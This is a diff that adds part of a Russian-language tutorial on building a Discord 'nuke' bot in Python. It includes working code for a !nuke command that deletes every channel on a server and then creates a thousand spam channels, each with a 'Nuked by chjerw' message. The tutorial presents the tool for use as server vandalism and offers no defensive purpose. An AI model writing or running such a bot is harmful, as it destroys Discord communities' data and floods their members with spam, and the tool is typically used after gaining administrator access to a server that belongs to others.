@@ -34,3 +34,39 @@ import discord
 from discord.ext import commands
 import asyncio
 ```
+Далее даём боту все права и создаем самого бота.
+```python
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="!", intents=intents)
+```
+<b>command_prefix</b> определяет какой тригер будет у наших команд, например если
+```python
+command_prefix="."
+```
+то команду в чате мы будем писать так:
+```bash
+.command
+```
+Далее нужно создать переменные для настройки нюка:
+```python
+count = 1000
+channel_name = "Nuked by chjerw"
+channel_message = "💣 Nuked by **chjerw** "
+```
+Тут ставьте что хотите!
+
+Теперь создаем саму команду <b>!nuke</b>:
+```python
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def nuke(ctx):
+    for channel in ctx.guild.channels:
+        await channel.delete()
+
+    for i in range(count):
+        channel = await ctx.guild.create_text_channel(channel_name+f"-{i}")
+        await channel.send(channel_message)
+```
+Логика тут простая, если бот видит что в чате написали <b>!nuke</b>, то он удаляет каждый канал из списка всех каналов (то есть удаляет всё что есть на сервере).
+Потом он создает каналы с названиями <b>channel_name</b> и сообщениями <b>channel_message</b> внутри них.
+Количество создаваемых каналов определяет переменная <b>count</b>.
